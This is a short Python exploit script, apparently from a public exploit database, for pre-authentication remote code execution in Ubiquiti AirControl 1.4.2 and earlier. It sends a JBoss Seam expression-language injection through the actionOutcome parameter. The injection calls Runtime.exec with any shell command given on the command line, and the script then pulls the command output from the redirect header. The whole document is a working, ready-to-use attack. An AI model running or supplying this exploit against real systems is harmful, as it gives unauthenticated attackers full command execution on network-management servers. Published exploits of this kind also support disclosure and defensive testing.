# Exploit Title: AirControl 1.4.2 - PreAuth Remote Code Execution
# Date: 2020-06-03
# Exploit Author: 0xd0ff9 vs j3ssie
# Vendor Homepage: https://www.ui.com/
# Software Link: https://www.ui.com/download/#!utilities
# Version: AirControl <= 1.4.2
# Signature: https://github.com/jaeles-project/jaeles-signatures/blob/master/cves/aircontrol-rce.yaml

import requests
import re
import urllib
import sys


print """USAGE: python exploit_aircontrol.py [url] [cmd]"""


url = sys.argv[1]
cmd = sys.argv[2]


burp0_url = url +"/.seam?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.io.BufferedReader').getDeclaredMethod('readLine').invoke(''.getClass().forName('java.io.BufferedReader').getConstructor(''.getClass().forName('java.io.Reader')).newInstance(''.getClass().forName('java.io.InputStreamReader').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(''.getClass().forName('java.lang.Process').getDeclaredMethod('getInputStream').invoke(''.getClass().forName('java.lang.Runtime').getDeclaredMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(null),'"+cmd+"')))))}"
burp0_headers = {"User-Agent": "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Doflamingo) Chrome/80.0.3984.0 Safari/537.36", "Connection": "close"}
r = requests.get(burp0_url, headers=burp0_headers, verify=False, allow_redirects=False)

Locat =  r.headers["Location"]

res = re.search("pwned=(.*)(&cid=.*)",Locat).group(1)

print "[Result CMD] ",cmd,": ",urllib.unquote_plus(res)